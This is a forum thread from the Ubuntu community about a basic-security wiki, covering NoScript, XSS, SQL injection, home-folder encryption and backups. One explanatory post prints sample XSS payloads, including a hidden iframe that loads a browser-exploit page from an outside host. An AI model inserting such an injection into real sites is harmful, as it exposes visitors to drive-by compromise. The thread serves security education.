None of my apps are public. And yes, they're applications used to perform specific tasks. Things like xss simply have no value for us. We don't have ad banners or weird tech running for no apparent reason. But we do have all sorts of client-side code, and we don't plan on stopping. 

There was a comment about web developers using incorrect/improperly formatted markup. I seriously doubt anyone reading this hates that more than I do. We use the strict form of HTML and generally somebody will send out a nastygram if code is checked in with even bad indenting. 

My thumbs are tired. I hope you guys get something worthwhile out of this, and I hope to be on a real computer next time I post here

I think you may be missing the point, the thread itself is about basic security for Ubuntu from which a Wiki was born and a good job has been done.  It is about providing basic security knowledge for the newbie to Ubuntu.

The thread itself has somewhat gone off track a few times but that is ok.

As for Noscript in particular, our point is use it and educate yourself how to use it and why.

We are not saying client side scripting is bad or you shouldnt allow it, we are saying educate yourself to the risks and then mitigate them or accept them based on who or what you decide to trust.

As for trust, your website code's security is not all about you who wrote it, your site can get compromised so that even if we trust you and your code we still get 0wn3d due to someone else modifying your code.

With education and use of the right tools we can help to prevent this effecting people with little security knowledge.

Is javascript needed to a functional browse, yes for most pages, do i always trust it ? of course not, should i trust it, NO WAY....do i decide to ? that is upto me as i understand the risk.

As for social engineering, to be honest though that subject came up it wasnt or isnt focused on in our wiki due to the size and application of it as it pertains to basic Ubuntu security.

Is it malicious, no not all the time of course, can it be? of course so again something to be aware of.

Internet footprints are the demise of many people daily due to malicious SE attacks but we are not saying all SE is bad or designed to be so.

And it is not about paranoia it is about education, something i wish web developers spent more time on themselves (no offence meant to you) but i do mean it as a general statement to web developers all over, they are web devs and not security specialisits (sadly).

And the XSS doesnt need to be put in place by you either ;-)
Cheers

---

### Post by Dangertux on 2011-12-03
Okay let's clarify a couple of things here.

Markup really has nothing to do with web application exploitation.  Markup is simply that -- a language that instructs a browser as to how to display a site. Of course webkit, new CSS and HTML5 will change all of this, but as of now that's the standard accepted definition.

Scripting languages like javascript, php, ruby, python, perl whatever can be utilized to make executable code -- a program capable of storing information and making logic based decisions. This is what is exploited. In the example where I was talking about sanitizing user input in reference to quotes, was input from cookies, post requests, get requests and any other method that allows a web application to be leveraged to complete an additional database query. This is SQL injection.

Now if you want to get in depth and analyze cross site scripting since that was what was brought up in this thread. Yes you can proxy XSS or do reflective based XSS attacks. 

For instance one method of creating persistent XSS , which uses the the target domain as its host would be a website (usually an order form) that excepts user input and reads it back to them, perhaps their mailing address.  Normally it might be expecting the following for an address field.

123 Pwnsauce St.Ownageville CA 31337

Now if it "trusts" us to do that, and doesn't validate what we're saying, we could instead put this for our address field.

```

<SCRIPT>alert("XSS is Bad")</SCRIPT>

```
if this were not being properly escaped when we were "shown" our input we would be presented with a nice little message box informing us XSS was bad.  Now obviously , this is only one use, there are more malicious uses. This is also only one method of XSS. Another more valid example say this forum didn't sanitize my posts properly and parsed inline javascript in and html in my post. and I put something like this in my post

```

<IFRAME height="0" width="100%" src="http://dangertux.com/browserexploit.html">.</IFRAME>

```Where the source is an HTML file hosted on another site that contains a script that exploits my browser, injects a payload and calls it a day. 

When anyone viewed my post, they would be affected. Now -- if they are running NoScript the "proxy" effect here would be mitigated because the script would STILL be loaded from an external source, and should still fall under the same origin policy.  

Alternatively the browser exploit could be placed directly in the iframe, and the SOP would NOT be violated,  in this case we're not proxying instead we're hoping the user will click "allow script". So where does all of the responsibility lie? On the web developers writing bad code -- we shouldn't need NoScript, but we do take it for what it's worth.

Hope this helps.

---

### Post by OpSecShellshock on 2011-12-03
Keep in mind that the posts above apply to compromised or otherwise exploited sites having their code taken advantage of. There are also many, many sites built from the ground up expressly to deliver malicious code to the browser and/or its plugins. Users are led to them by techniques like SEO manipulation (also a form of social engineering, also widely used by ostensibly legitimate sites). NoScript will help against these sites as well, so long as the scripts are not allowed. Basically the advantage provided with NoScript is that it allows users to block by default and allow selectively depending on which site functions they need/want to make use of. The browser is being run by the client machine, and it is therefore the user of the client machine who should determine what it does, not the developer of an external host's application. Often what the user wants and what the developer wants are the same thing, and that's great. Sometimes they want different things, and it's difficult to impossible to predict when those times are going to come around. NoScript helps to ensure that conflicts between the user's interest and the web application's interest are resolved in favor of the user.

---

### Post by Dangertux on 2011-12-03
> **opsecshellshock said:**
> keep in mind that the posts above apply to compromised or otherwise exploited sites having their code taken advantage of. There are also many, many sites built from the ground up expressly to deliver malicious code to the browser and/or its plugins. Users are led to them by techniques like seo manipulation (also a form of social engineering, also widely used by ostensibly legitimate sites). Noscript will help against these sites as well, so long as the scripts are not allowed. Basically the advantage provided with noscript is that it allows users to block by default and allow selectively depending on which site functions they need/want to make use of. The browser is being run by the client machine, and it is therefore the user of the client machine who should determine what it does, not the developer of an external host's application. Often what the user wants and what the developer wants are the same thing, and that's great. Sometimes they want different things, and it's difficult to impossible to predict when those times are going to come around. Noscript helps to ensure that conflicts between the user's interest and the web application's interest are resolved in favor of the user.

+10000000000

---

### Post by Ms. Daisy on 2012-01-10
Hi folks!  I'm reviving this sleeping thread in the hopes that you all will critique a modification I made to the Basic Security Wiki regarding encryption.  After a few threads in this forum where encryption seemed to be widely misunderstood (including by me), I thought I'd take the opportunity to educate myself and to add some more useful info into the wiki.

Plus, I know that there's at least one encryption expert that was subscribed to this thread. It sure would be cool if you could take a quick glance ;)

[https://wiki.ubuntu.com/BasicSecurity#Encrypt_Your_Home_Folder](https://wiki.ubuntu.com/BasicSecurity#Encrypt_Your_Home_Folder)

Here's the bit I added:
> Encrypting the home folder will help for physical security. If someone  is able to sit down in front of your computer or if they steal it, they  won't be able to see the files in your home folder. In Ubuntu when you  encrypt the home folder, the folder mounts when you log in which makes  it readable to anyone sitting in front of your computer. Once you log  out, the home folder unmounts and is encrypted again. Encrypting the  home folder will do nothing to protect you from on-line threats. As long  as the encrypted folder is mounted, it will be plain text for anyone  with access. 

---

### Post by CharlesA on 2012-01-10
Looks good. Keep up the good work!

---

### Post by MadsRC on 2012-01-11
In the wiki there is this line:
> You should also keep in mind that if you encrypt your home folder or hard drive, that if your system fails later on it will be harder to recover your files.

When talking about Full Disk Encryption, the above line would only count if you suffer hardware failure or an accidental format.

If you, say accidently lost a few files, and don't have an backup, you can always decrypt the harddisk, and run a recovery programme.

If you suffered a hardware failure or accidental format, you would have to recover the WHOLE encrypted volume (incase of FDE it would mean the ENTIRE harddrive) and then hope you can still decrypt it (Which could be a problem if ou can't recover the ENTIRE harddrive).

In short: If using encryption, you would have to treat multiple lost data as one big lost file and have to recover that. If just a tiny bit of that fail (Which it will with a high propability) then you can't recover. If it succeeds, you should have your data back (possibly have to use recovery tool on the decrpyted datapool).

Please correct me if I'm wrong (I must be wrong somewhere :D)

The wiki also states:
> You will have to consider the value of the data you store on your computer to determine if encryption is worth the risk.
If we would have to consider the value of the data (Remember that the wiki is for security novices), shouldn't it also explain the risk in FDE vs Home Encryption vs No encryption when talking about recovery?

---

### Post by OpSecShellshock on 2012-01-11
Well if folks are following from the beginning of the wiki then they'll already have fairly recent backups. That's why backing files up is one of the main pieces of advice that security pros give but don't take.

---

### Post by MadsRC on 2012-01-11
That is correct. With a decent backup, recovery shouldn't be an issue.

Reminds me to refresh my backup at home, again :D

---

### Post by WasMeHere on 2012-01-13
> **OpSecShellshock said:**
> Well if folks are following from the beginning of the wiki then they'll already have fairly recent backups. That's why backing files up is one of the main pieces of advice that security pros give but don't take.

Tough guys don't backup their data, they do the work twice instead ;-)

---

### Post by Ms. Daisy on 2012-02-28
I just created a sub-page for Dangertux's NoScript Configuration guide.  I also created a sub-page for Dangertux's "Did I Just Get Owned?" guide.  This should make the Basic Security Wiki a little less intimidating to look at.

Direct all hate mail to me :)

---

### Post by WasMeHere on 2012-02-28
> **Ms. Daisy said:**
> I just created a sub-page for Dangertux's NoScript Configuration guide.  I also created a sub-page for Dangertux's "Did I Just Get Owned?" guide.  This should make the Basic Security Wiki a little less intimidating to look at.

Direct all hate mail to me :)
I think it is a good idea because it makes the Basic Security Wiki a little less intimidating, but also because people with questions about those issues can be linked directly to the sub-pages.

---

### Post by seomangb on 2013-02-21
Hi!
To learn net security one needs to start somewhere.
It's not so important where is your starting point as it is to 'build around it'!
It doesn't matter what operating system you use if you have no idea about the basics of Internet communication (or, how the network protocols work etc.)
The best thing to do would be to start from what seems to be easier and, by all means, to be sure you don't 'turn the page' until you are reallllllly familiar with all the terms you read!
Once you have a grasp of IT basics than the quickest way to learn would be to think like a hacker: grab a classical book of net security and read it (again, don't turn the page until...').
Looks easy? Well, it is up to a certain point - the Point of No Return :)
Good Luck!

---

### Post by QIII on 2013-02-21
Thank you for sharing.  Everyone&#8217;s questions and answers are valuable.

If a thread has had no activity for about a year or more, it is best to start a new thread of your own. Not only will you be more likely to get a response, but things change so quickly in the software world that an old thread may cause you more trouble than it will help due to outdated information.

Please feel free to add a link to this thread in the new one you start.

Best wishes!

*Thread **closed.***

---

